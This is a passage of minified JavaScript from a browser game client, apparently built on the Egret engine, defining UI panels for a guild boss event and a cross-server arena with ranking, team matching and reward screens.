i=s.EntityManager.ins().getEntityByHandle(t[0]);if(i){var o=i.infoModel;this.belongTxt.textFlow=n.TextFlowMaker.generateTextFlow1(""+t[1]),this.eFace.source="yuanhead"+o.job+o.sex}else this.belongTxt.textFlow=n.TextFlowMaker.generateTextFlow1(""+t[1]);t[2]||(this.rewardLabel.text=gettext("我的参与奖："));var a=t[3];this.saleList.dataProvider=new eui.ArrayCollection(a),0==a.length&&(this.saleLabel.text=gettext("行会拍卖品：无"));var r=t[4];this.rewardList.dataProvider=new eui.ArrayCollection(r),Timer.start(1e3,this.quitTime+1,this.onTimer,this),this.onTimer()},e.prototype.onCloseWin=function(){win.close(this),send(Ts.exitFB)},e.prototype.onTimer=function(){this.closeBtn.label=gettext("确定({0})",--this.quitTime),this.quitTime<=0&&this.onCloseWin()},e}(o.BaseView);e.DevildomResultWin=r,window.DevildomResultWin=r,__reflect(r.prototype,"DevildomResultWin",[]),window.DevildomResultWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomWin=void 0;var n=i(1),o=i(0),s=i(4),a=i(64),r=i(7),l=i(2),h=i(27),u=i(26),p=i(125),d=i(1219),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.helpConfig={HelpCfg2:null},e.lastTimer=0,e}return __extends(e,t),e.prototype.skinComplete=function(){if(p.DevildomSys.ins().isInDevilZoneSvr()){var t=o.GlobalConfig.DevilBossBase.startTime,e=o.GlobalConfig.DevilBossBase.startTime2;t&&e?t[0]>e[0]||t[0]==e[0]&&t[1]>e[1]?this.refreshTime.text=e[0]+":"+e[1]+"，"+(t[0]+":"+t[1]):this.refreshTime.text=t[0]+":"+t[1]+"，"+(e[0]+":"+e[1]):this.refreshTime.text=t[0]+":"+t[1]}else{var i=r.GameServerCC.isInOtherPlayTime()?o.GlobalConfig.DevilBossBase.startTime2:o.GlobalConfig.DevilBossBase.startTime;this.refreshTime.text=i[0]+":"+i[1]}this.helpConfig={HelpCfg2:o.GlobalConfig.HelpInfoConfig[8]}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.lastTimer=0,this.dataSys=p.DevildomSys.ins(),this.addTouchEvent(this.closeBtn,this.onTouch),this.addTouchEvent(this.challengeBtn,this.onTouch),this.addTouchEvent(this.belongBtn,this.onTouch),this.addTouchEvent(this.partBtn,this.onTouch),this.addTouchEvent(this.btnHelp2,this.onTouch),this.menuList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onChoose,this);var i=0;this.menuList.dataProvider=new eui.ArrayCollection([]),this.menuList.itemRenderer=d.DevildomBossTab,i=2,this.menuList.selectedIndex=i,o.GlobalConfig.DevilBossConfig[i+1].isBoss||this.selectBoss(i)},e.prototype.onTouch=function(t){var e,i=this;switch(t.target){case this.challengeBtn:if(p.DevildomSys.ins().historyId&&p.DevildomSys.ins().historyId!=this.menuList.selectedIndex+1)return void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:您已进入{0}地图，无法再进入此魔君地图！",o.GlobalConfig.DevilBossConfig[p.DevildomSys.ins().historyId].bossName));var n=(this.dataSys.enterCD-egret.getTimer())/1e3>>0;if(n>0)return void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}秒后可以进入！",n));var r=o.GlobalConfig.DevilBossConfig[this.menuList.selectedIndex+1],d=r.levelLimit/1e3>>0;if(d>u.ZsCT.ins().stage)return void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:转生等级到达{0}级可进去！",d));var c=r.levelLimit%1e3;if(c>s.ActorCC.level)return void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:人物等级到达{0}级可进去！",c));var f=egret.getTimer()-this.lastTimer;if(0!=this.lastTimer&&1e3>f)return;this.lastTimer=egret.getTimer(),a.MainUICC.onClickMap(!1),p.DevildomSys.ins().historyId?p.DevildomSys.ins().sendEnter(this.menuList.selectedIndex+1):h.WarnWin.show(gettext("魔君刷新后，只可进入其中一位魔君的地图且不可改变，是否进入？"),function(){i.dataSys.sendEnter(i.menuList.selectedIndex+1)},this);break;case this.closeBtn:win.close("DevilInvadeWin");break;case this.belongBtn:win.open("DevildomBelongAwardWin");break;case this.partBtn:win.open("DevildomPartAwardWin");break;case this.btnHelp2:win.open("CommonHelpWin",(null===(e=this.helpConfig.HelpCfg2)||void 0===e?void 0:e.text)||"")}},e.prototype.onChoose=function(t){this.selectBoss(this.menuList.selectedIndex)},e.prototype.selectBoss=function(t){var e=[],i=o.GlobalConfig.DevilBossConfig;if(i){for(var n in i)i[n].isBoss||e.push(i[n].id);this.menuList.dataProvider=new eui.ArrayCollection(e);var s=this.menuList.selectedIndex+1;this.bossName.source="mojie_guiname"+t,this.bossImg.source="testrole_"+t,this.challengeBtn.enabled=(p.DevildomSys.ins().isHfTerm()||r.GameServerCC._hefuCount>=2)&&this.dataSys.killedState.length>0&&!this.dataSys.killedState[s]}},e}(n.BaseView);e.DevildomWin=c,window.DevildomWin=c,__reflect(c.prototype,"DevildomWin",[]),window.DevildomWin=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomBossTab=void 0;var n=i(3),o=i(125),s=i(0),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t;if(this.data){var e=o.DevildomSys.ins();this.itemIcon.source="mojie_gui"+(this.data-1),this.nameLabel.text=null===(t=s.GlobalConfig.DevilBossConfig[this.data])||void 0===t?void 0:t.bossName,this.state.visible=e.killedState[this.data]}},e}(n.BaseItemRender);e.DevildomBossTab=a,window.DevildomBossTab=a,__reflect(a.prototype,"DevildomBossTab",[]),window.DevildomBossTab=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaDuanPanel=void 0;var n=i(1),o=i(1222),s=i(77),a=i(141),r=i(47),l=i(24),h=i(0),u=i(76),p=i(55),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KfArenaDuanSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listArray=new eui.ArrayCollection,this.list.itemRenderer=o.KfArenaDuanItemRender,this.rewardList.touchChildren=!1,this.list.dataProvider=this.listArray,this.rewardList.itemRenderer=s.ItemBaseNoName,this.degree.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.degree.text+"</u>"),this.addTouchEvent(this.rewardList,this.onTouch),this.addTouchEvent(this.degree,this.onTouch)},e.prototype.addDisplay=function(){observe(this,this.update,a.KfArenaRedPoint.ins().postRedPoint_2),this.update()},e.prototype.update=function(){var t=r.KfArenaSys.ins().getDuanAwards();for(var e in t)t[e].isRedPoint=a.KfArenaRedPoint.ins().joinState;this.redPoint.visible=1==a.KfArenaRedPoint.ins().joinState,this.get.visible=2==a.KfArenaRedPoint.ins().joinState;var i=l.CommonUtils.objectToArray(h.GlobalConfig.CrossArenaRankAward),n=l.CommonUtils.objectToArray(h.GlobalConfig.CrossArenaMetalAward);n.sort(this.sort);for(var o=0,s=n;o<s.length;o++){var e=s[o];i.push(e)}this.listArray.source=i,this.rewardList.dataProvider=new eui.ArrayCollection(t),this.dw.text=r.KfArenaSys.ins().getDuanName()},e.prototype.onTouch=function(t){switch(t.target){case this.rewardList:r.KfArenaSys.ins().sendDailyRewards();break;case this.degree:win.open(u.CommonHelpWin,h.GlobalConfig.CrossArenaBase.degreeTpis)}},e.prototype.sort=function(t,e){return p.Algorithm.sortDesc(t.metal,e.metal)},e}(n.BaseView);e.KfArenaDuanPanel=d,window.KfArenaDuanPanel=d,__reflect(d.prototype,"KfArenaDuanPanel",[]),window.KfArenaDuanPanel=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaDuanItemRender=void 0;var n=i(3),o=i(11),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.reward.itemRenderer=o.ItemBase},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.dwImg.source=""+t.icon,this.dwName.text=""+t.name,this.background.source=""+t.background,this.reward.dataProvider=new eui.ArrayCollection(t.award)}},e}(n.BaseItemRender);e.KfArenaDuanItemRender=s,window.KfArenaDuanItemRender=s,__reflect(s.prototype,"KfArenaDuanItemRender",[]),window.KfArenaDuanItemRender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaFightWin=void 0;var n=i(8),o=i(1),s=i(0),a=i(23),r=i(44),l=i(490),h=i(7),u=i(47),p=i(76),d=i(53),c=i(304),f=function(t){function e(){var e=t.call(this)||this;return e._sn_="KfArenaFightSkin",e.lastTips=!1,e.lastAScoreTip=!1,e.lastBScoreTip=!1,e._isInit=!1,e._startTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.bigTimeGroup.visible=!0,this._isInit=!0,this.showTimeInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.rectMark.visible=!0,this.modeSys=u.KfArenaSys.ins(),this.addTouchEvent(this.seeRule,this.onTouch),this.addTouchEvent(this.infoBtn,this.onTouch),observe(this,this.upScore,this.modeSys.postChangeScore),observe(this,this.updata,this.modeSys.postMyBattleInfo),observe(this,this.onRemove,a.GameLogic.ins().postRemoveEntity),observe(this,this.openOtherPlayerView,r.ReadPlayerCT.ins().postPlayerResult),observe(this,this.showTimeInfo,u.KfArenaSys.ins().postFbInfo1),this.blueScore.text="0",this.redScore.text="0",this.upScore(),this.updata(),this.showTimeInfo()},e.prototype.showTimeInfo=function(){this.upScore(),this._startTime=u.KfArenaSys.ins().startTime,this.endTimeStamp=u.KfArenaSys.ins().endTime,this.endTimeStamp>h.GameServerCC.serverTime&&(Timer.has(this.lefttimeFun,this)||Timer.start(1e3,0,this.lefttimeFun,this)),this._isInit&&void 0!=this._startTime&&(this._startTime<=h.GameServerCC.serverTime?(this.rectMark.visible=!1,this.bigTimeGroup.visible=!1,d.ControlCC.setAuto(!0),Timer.stop(this.timeGo,this)):this.startCountDown())},e.prototype.openOtherPlayerView=function(t){win.open(l.RRoleWin,t)},e.prototype.onRemove=function(t){var e,i=(t[0],t[1]);(null===(e=null===i||void 0===i?void 0:i.data)||void 0===e?void 0:e.type)!=EntityType.Role||i.infoModel.camp!=u.KfArenaSys.ins().myCampId},e.prototype.updata=function(){this.modeSys&&(this.score.text=this.modeSys.ownScore+"",this.rank.text=this.modeSys.ownBattleRank+"")},e.prototype.upScore=function(){this.modeSys&&(1==this.modeSys.myCampId?(this.blueScore.text=this.modeSys.scoreA+"",this.redScore.text=this.modeSys.scoreB+""):(this.blueScore.text=this.modeSys.scoreB+"",this.redScore.text=this.modeSys.scoreA+""),s.GlobalConfig.CrossArenaBase.tipScore||(s.GlobalConfig.CrossArenaBase.tipScore=800),!this.lastAScoreTip&&this.modeSys.scoreA>=s.GlobalConfig.CrossArenaBase.tipScore?(this.showScoreTip(1==this.modeSys.myCampId?1:2,this.modeSys.scoreA),this.lastAScoreTip=!0):!this.lastBScoreTip&&this.modeSys.scoreB>=s.GlobalConfig.CrossArenaBase.tipScore&&(this.showScoreTip(1==this.modeSys.myCampId?2:1,this.modeSys.scoreB),this.lastBScoreTip=!0))},e.prototype.showScoreTip=function(t,e){this.hintImg.source=1==t?"kfarena_words_win_friend":"kfarena_words_win_enemy",this.bigTimeGroup.visible=!0,this.countDown.text=e+"",Timer.start(5e3,1,this.hideEnd,this)},e.prototype.onTouch=function(t){switch(t.target){case this.seeRule:win.open(p.CommonHelpWin,s.GlobalConfig.HelpInfoConfig[42].text);break;case this.infoBtn:win.open(c.KfArenaResultWin,0,0,0,null,null,2)}},e.prototype.startCountDown=function(){this.leftTime&&(this.leftTime.visible=!1),this.hintImg.source="kfarena_words_start",this.timeGo(),this._startTime-h.GameServerCC.serverTime>0&&!Timer.has(this.timeGo,this)&&(this.bigTimeGroup.visible=!0,Timer.start(1e3,0,this.timeGo,this))},e.prototype.timeGo=function(){var t=(this._startTime-h.GameServerCC.serverTime)/1e3>>0;if(t>0)this.countDown.text=t+"";else{console.log("aaaaaaaaaaaaaaa222"),this.rectMark.visible=!1,d.ControlCC.setAuto(!0),Timer.stop(this.timeGo,this),this.bigTimeGroup.visible=!1,this.leftTime.visible=!0;var e=(this.endTimeStamp-h.GameServerCC.serverTime)/n.DateUtils.MS_PER_SECOND>>0;e>0&&!Timer.has(this.lefttimeFun,this)&&Timer.start(1e3,0,this.lefttimeFun,this)}},e.prototype.lefttimeFun=function(){var t=(this.endTimeStamp-h.GameServerCC.serverTime)/n.DateUtils.MS_PER_SECOND>>0;return 0>=t?void Timer.stopAll(this):(this.leftTime&&(this.leftTime.text=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_3)),void(!this.lastTips&&10>=t&&(this.lastTips=!0,this.countDown.text=t+"",this.hintImg.source="kfarena_words_end",this.bigTimeGroup.visible=!0,Timer.start(5e3,1,this.hideEnd,this))))},e.prototype.hideEnd=function(){this.bigTimeGroup.visible=!1},e}(o.BaseView);e.KfArenaFightWin=f,window.KfArenaFightWin=f,__reflect(f.prototype,"KfArenaFightWin",[]),window.KfArenaFightWin=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaJoinPanel=void 0;var n=i(1),o=i(1225),s=i(47),a=i(0),r=i(141),l=i(55),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KfArenaJoinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listArray=new eui.ArrayCollection,this.list.itemRenderer=o.KfArenaJoinItemRender,this.list.dataProvider=this.listArray},e.prototype.addDisplay=function(){observe(this,this.update,s.KfArenaSys.ins().postJoinRewards),this.update()},e.prototype.update=function(){var t=a.GlobalConfig.CrossArenaBase.peakAwards,e=[],i=1;for(var n in t)t[n].id=i,t[n].sortIndex=1,1==(s.KfArenaSys.ins().dflState>>i&1)?t[n].sortIndex=0:r.KfArenaRedPoint.ins().JoinRedPoint.length>0&&r.KfArenaRedPoint.ins().JoinRedPoint[i]>0&&(t[n].sortIndex=2),e.push(t[n]),i++;e.sort(this.sort),this.listArray.source=e,this.myRecord.text=s.KfArenaSys.ins().dflCount+""},e.prototype.sort=function(t,e){var i=l.Algorithm.sortDesc(t.sortIndex,e.sortIndex);return 0==i&&(i=l.Algorithm.sortAsc(t.id,e.id)),i},e}(n.BaseView);e.KfArenaJoinPanel=h,window.KfArenaJoinPanel=h,__reflect(h.prototype,"KfArenaJoinPanel",[]),window.KfArenaJoinPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaJoinItemRender=void 0;var n=i(3),o=i(11),s=i(47),a=i(141),r=i(5),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="KfArenaJoinItemSkin",e.isGet=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=o.ItemBase,this.btnGroup.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e.prototype.dataChanged=function(){if(this.data){this.isGet=!1,this.stateImg.source="huodong_kfkfwwc",this.btnGroup.visible=!1,this.target.textFlow=r.TextFlowMaker.generateTextFlow1(gettext("竞技场获得|C:0x00FF6C&T:{0}|巅峰令",""+this.data.count));var t=s.KfArenaSys.ins().dflState;1==(t>>this.data.id&1)?(this.stateImg.source="huodong_json.huodong_yhd",this.btnGroup.visible=!1):a.KfArenaRedPoint.ins().JoinRedPoint.length>0&&a.KfArenaRedPoint.ins().JoinRedPoint[this.data.id]>0&&(this.isGet=!0,this.stateImg.source=null,this.btnGroup.visible=!0),this.rewardList.dataProvider=new eui.ArrayCollection(this.data.award)}},e.prototype.onTap=function(t){this.isGet&&s.KfArenaSys.ins().sendJoinRewards(this.data.id)},e.prototype.destruct=function(){this.btnGroup.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e}(n.BaseItemRender);e.KfArenaJoinItemRender=l,window.KfArenaJoinItemRender=l,__reflect(l.prototype,"KfArenaJoinItemRender",[]),window.KfArenaJoinItemRender=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaMacthPanel=void 0;var n=i(1),o=i(0),s=i(47),a=i(5),r=i(2),l=i(141),h=i(76),u=i(7),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KfArenaMacthSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.memberArr=[this.leader,this.member1,this.member2],this.dailyTime.textFlow=a.TextFlowMaker.generateTextFlow1(gettext("每天恢复|C:0x00FF6C&T:{0}|次",""+o.GlobalConfig.CrossArenaBase.joinCount)),this.maxTime.textFlow=a.TextFlowMaker.generateTextFlow1(gettext("最多累计|C:0x00FF6C&T:{0}|次",""+o.GlobalConfig.CrossArenaBase.maxJoinCount)),this.addTouchEvent(this.disBtn,this.onTouch),this.addTouchEvent(this.macthBtn,this.onTouch),this.addTouchEvent(this.btn_help,this.onTouch)},e.prototype.addDisplay=function(){var t,e;observe(this,this.updateInfo,s.KfArenaSys.ins().postPlayerInfo),observe(this,this.update,s.KfArenaSys.ins().postTeamInfo),observe(this,this.update,s.KfArenaSys.ins().postMacthState),this.update(),this.actTime.text=u.GameServerCC.isInOtherPlayTime()?null===(t=o.GlobalConfig.CrossArenaBase)||void 0===t?void 0:t.starttime2:null===(e=o.GlobalConfig.CrossArenaBase)||void 0===e?void 0:e.starttime},e.prototype.update=function(){this.updateMember(),this.updateInfo(),this.updateBtnState()},e.prototype.updateMember=function(){this.roleGroup.visible=s.KfArenaSys.ins().getIsJoinTeam();for(var t=0,e=this.memberArr;t<e.length;t++){var i=e[t];i.data=null}var n=s.KfArenaSys.ins().tfMembers,o=1;if(n&&n.length)for(var a=0;a<n.length;a++){var r=n[a],l=r.isLeader();l?this.leader.data=r:(this.memberArr[o].data=r,o++)}},e.prototype.updateInfo=function(){var t=s.KfArenaSys.ins();this.curMonthLabel.textFlow=a.TextFlowMaker.generateTextFlow(gettext("当前战绩：|C:{0}&T:{1}胜{2}平{3}败|",10458221,t.curMouth.win,t.curMouth.ping,t.curMouth.fail)),this.winRateLbl.textFlow=a.TextFlowMaker.generateTextFlow(gettext("当前胜率：|C:{0}&T:{1}|",16298305,t.getWinRate())),this.countLabel.textFlow=a.TextFlowMaker.generateTextFlow(gettext("可挑战次数: |C:0x00FF6C&T:{0}|",""+t.times)),this.macthingLabel.visible=1==t.macthState,this.duanTxt.text=t.getDuanName1(),this.duanImg.source="kfarena_rank_img_"+((t.duanLevel-1)/3>>0);var e=o.GlobalConfig.CrossArenaBase.scoreMetal[t.duanLevel];e?(this.scoreProgressTxt.text=t.score+"/"+e,this.nextDuanTxt.text=gettext("再获得{0}积分晋升到{1}",e-t.score,t.getDuanName(t.duanLevel+1))):(this.scoreProgressTxt.text=t.score+"/"+o.GlobalConfig.CrossArenaBase.scoreMetal[t.duanLevel-1],this.nextDuanTxt.text=gettext("当前已达最高阶"))},e.prototype.updateBtnState=function(){var t=s.KfArenaSys.ins().getIsJoinTeam();this.waitGroup.visible=!t,this.matchGroup.visible=t,t?(s.KfArenaSys.ins().isTFCaptain?this.disBtn.label=gettext("解散战队"):this.disBtn.label=gettext("离开战队"),1==s.KfArenaSys.ins().macthState?this.macthBtn.label=gettext("取消匹配"):this.macthBtn.label=gettext("开始匹配")):(this.disBtn.label=gettext("创建战队"),this.macthBtn.label=gettext("单人匹配"))},e.prototype.onTouch=function(t){switch(t.target){case this.btn_help:var e=o.GlobalConfig.HelpInfoConfig[314];win.open(h.CommonHelpWin,(null===e||void 0===e?void 0:e.text)||"");break;case this.disBtn:if(0==s.KfArenaSys.ins().isStartIng)return void r.TipsCT.ins().showTips(o.GlobalConfig.CrossArenaBase.hintTxt);if(!s.KfArenaSys.ins().checkFunIsOpen())return;if(!s.KfArenaSys.ins().getIsJoinTeam())return void s.KfArenaSys.ins().sendCreateTeam();s.KfArenaSys.ins().sendLeaveTeam();break;case this.macthBtn:l.KfArenaRedPoint.ins().postRedPoint();var i=s.KfArenaSys.ins();if(1==i.macthState)return i.isTFCaptain?void i.sendCancelMacth():void r.TipsCT.ins().showTips(gettext("只有队长才可以取消匹配"));if(0==s.KfArenaSys.ins().isStartIng)return void r.TipsCT.ins().showTips(o.GlobalConfig.CrossArenaBase.hintTxt);if(!s.KfArenaSys.ins().checkFunIsOpen())return;if(!i.getIsJoinTeam())return void i.sendPersonalMatch();if(!i.isTFCaptain)return void r.TipsCT.ins().showTips(gettext("只有队长才可以开始匹配"));var n=i.getIsNoOnline();if(""!=n)return void r.TipsCT.ins().showTips(gettext("{0}离线了，请稍后匹配",n));i.sendStartMacth()}},e.prototype.tabRp=function(){return l.KfArenaRedPoint.ins().redpoint_1>0},e}(n.BaseView);e.KfArenaMacthPanel=p,window.KfArenaMacthPanel=p,__reflect(p.prototype,"KfArenaMacthPanel",[]),window.KfArenaMacthPanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaRankItemRender1=void 0;var n=i(3),o=i(44),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="KfArenaRoleItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.rankImg.visible=!0,this.invite.visible=this.position.visible=!1},e.prototype.onTouch=function(t){this._info&&o.ReadPlayerCT.ins().sendFindPlayer(this._info.playerId,this._info.servId)},Object.defineProperty(e.prototype,"idx",{set:function(t){this._idx=t},enumerable:!1,configurable:!0}),e.prototype.dataChanged=function(){this._info=this.data,this._info?(this.lab.visible=this.nomember.visible=!1,this.rolegroup.visible=!0,this.txtName.text=this._info.playerName,this.role.source="Role_zy"+this._info.job,this.rankImg.source="paihang_d"+this._info.rank,this.imgJob.source="yuanhead"+this._info.job+"1",this.pow.text=this._info.power+""):(this.nomember.visible=this.lab.visible=!0,this.rolegroup.visible=!1,this.rankImg.source="paihang_d"+this._idx)},e.prototype.destruct=function(){this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this)},e}(n.BaseItemRender);e.KfArenaRankItemRender1=s,window.KfArenaRankItemRender1=s,__reflect(s.prototype,"KfArenaRankItemRender1",[]),window.KfArenaRankItemRender1=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaRankPanel=void 0;var n=i(1),o=i(1229),s=i(47),a=i(44),r=i(0),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KfArenaRankSkin",e.fristView=!1,e._the3Items=[],e
}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.KfArenaRankItemRender,this.rankDatas=new eui.ArrayCollection,this.list.dataProvider=this.rankDatas,this._the3Items=[];for(var t=0;3>t;t++){var e=this["role"+t];this._the3Items.push(e),e.idx=t+1}this.firstGroup.visible=!1,this.firstGroup.touchChildren=!1,this.state.visible=!0,this.addTouchEvent(this.list,this.onViewPlayer),this.addTouchEvent(this.firstGroup,this.onViewPlayer)},e.prototype.addDisplay=function(){observe(this,this.upData,s.KfArenaSys.ins().postRank),observe(this,this.openOtherPlayer,a.ReadPlayerCT.ins().postPlayerResult),s.KfArenaSys.ins().sendRank()},e.prototype.upData=function(){var t=s.KfArenaSys.ins().rankDataList;if(0!=t.length){for(var e=0,i=this._the3Items.length;i>e;e++)e<t.length?this._the3Items[e].data=t[e]:this._the3Items[e].data=null;this.firstData=t.shift(),this.rankDatas.replaceAll(t),this.selfPos0.text=s.KfArenaSys.ins().ownRank>0?s.KfArenaSys.ins().ownRank+"":gettext("未上榜"),this.firstData&&(this.firstGroup.visible=!0,this.state.visible=!1,this.serverId0.text="S"+this.firstData.servId,this.vip0.visible=this.firstData.vip>0,this.firstNameTxt0.text=this.firstData.playerName,this.score0.text=this.firstData.score+"",this.seasonTitle0.text=r.GlobalConfig.CrossArenaBase.scoreMetalName[this.firstData.dan-1])}else{this.rankDatas.source=[],this.rankDatas.refresh();for(var n=0,o=this._the3Items;n<o.length;n++){var a=o[n];a.data=null}}},e.prototype.onViewPlayer=function(t){if(t.target instanceof o.KfArenaRankItemRender){var e=this.list.selectedItem;e&&a.ReadPlayerCT.ins().sendFindPlayer(e.playerId,e.servId)}else t.target==this.firstGroup&&this.firstData&&a.ReadPlayerCT.ins().sendFindPlayer(this.firstData.playerId,this.firstData.servId)},e.prototype.openOtherPlayer=function(t){this.fristView||(this.fristView=!0)},e}(n.BaseView);e.KfArenaRankPanel=l,window.KfArenaRankPanel=l,__reflect(l.prototype,"KfArenaRankPanel",[]),window.KfArenaRankPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaRankItemRender=void 0;var n=i(3),o=i(302),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="kfArenaRankItemSkin",e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){this.data instanceof o.KfArenaRankData&&(this.data.rank<=3?(this.rankImg.source="paihang_d"+this.data.rank,this.rankTxt.visible=!1,this.rankImg.visible=!0):(this.rankTxt.text=this.data.rank+"",this.rankTxt.visible=!0,this.rankImg.visible=!1),this.player.text=""+this.data.playerName,this.score.text=this.data.score+"",this.seasonTitle.text=s.GlobalConfig.CrossArenaBase.scoreMetalName[this.data.dan-1].concat('['+this.data.power+']'),this.serverId.text="S"+this.data.servId,this.vip.visible=this.data.vip>0)},e}(n.BaseItemRender);e.KfArenaRankItemRender=a,window.KfArenaRankItemRender=a,__reflect(a.prototype,"KfArenaRankItemRender",[]),window.KfArenaRankItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaRoleItemRender=void 0;var n=i(3),o=i(1231),s=i(4),a=i(1233),r=i(47),l=i(2),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="KfArenaRoleItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.rankImg.visible=!1,this.dataChanged()},e.prototype.onTouch=function(t){if(this.data)this.data.roleID!=s.ActorCC.actorID&&win.open(a.kfArenaCheckWin,this.data);else{if(!r.KfArenaSys.ins().isTFCaptain)return void l.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));if(1==r.KfArenaSys.ins().macthState)return void l.TipsCT.ins().showTips(gettext("需取消匹配后邀请"));win.open(o.KfArenaInviteWin)}},e.prototype.dataChanged=function(){if(this.data){this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=this.lab.visible=!1;var t=this.data;this.txtName.text=t.roleName,this.position.visible=t.isLeader(),this.role.source="Role_zy"+t.job,this.pow.text=t.power+"",this.imgJob.source="yuanhead"+t.job+"1"}else this.nomember.visible=this.invite.visible=this.lab.visible=!0,this.rolegroup.visible=!1},e.prototype.destruct=function(){this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this)},e}(n.BaseItemRender);e.KfArenaRoleItemRender=h,window.KfArenaRoleItemRender=h,__reflect(h.prototype,"KfArenaRoleItemRender",[]),window.KfArenaRoleItemRender=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaInviteWin=void 0;var n=i(1),o=i(1232),s=i(47),a=i(303),r=i(2),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="kfInviteSkin",e.friendList=[],e.guildList=[],e.type=0,e.cdTime=30,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listView.itemRenderer=o.kfArenaMemberItemRender,this.worldInvite.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.worldInvite.text+"</u>"),this.listArray=new eui.ArrayCollection,this.listView.dataProvider=this.listArray,this.updateTabRedPt()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBtn0,this.onTouch),this.addTouchEvent(this.worldInvite,this.onTouch),observe(this,this.updateGuild,s.KfArenaSys.ins().postKfArenaGuilds),this.type=a.KFInviteType.Friend,s.KfArenaSys.ins().sendGuilds(1)},e.prototype.updateGuild=function(t){switch(this.type=t,t){case a.KFInviteType.Friend:break;case a.KFInviteType.Guild:this.guildList=s.KfArenaSys.ins().getDataList(t)}this.setType(this.type)},e.prototype.onTabClick=function(t){void 0===t&&(t=null)},e.prototype.updateTabRedPt=function(){},e.prototype.onTouch=function(t){switch(t.target){case this.closeBtn0:win.close(this);break;case this.worldInvite:var e=egret.getTimer(),i=(s.KfArenaSys.ins().worldTimeCd-e)/1e3>>0;i>0?r.TipsCT.ins().showTips(gettext("{0}秒后可再次世界邀请",i)):(s.KfArenaSys.ins().worldTimeCd=e+1e3*this.cdTime,s.KfArenaSys.ins().sendWorldInvite(),r.TipsCT.ins().showTips(gettext("邀请发送成功")))}},e.prototype.setType=function(t){switch(t){case a.KFInviteType.Friend:this.listArray.source=this.friendList,this.noPlayer.visible=0==this.friendList.length;break;case a.KFInviteType.Guild:this.listArray.source=this.guildList,this.noPlayer.visible=0==this.guildList.length}},e}(n.BaseView);e.KfArenaInviteWin=l,window.KfArenaInviteWin=l,__reflect(l.prototype,"KfArenaInviteWin",[]),window.KfArenaInviteWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.kfArenaMemberItemRender=void 0;var n=i(3),o=i(136),s=i(24),a=i(47),r=i(2),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.itemData=new o.GuildMemberInfo,this.inviteBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e.prototype.dataChanged=function(){this.data instanceof 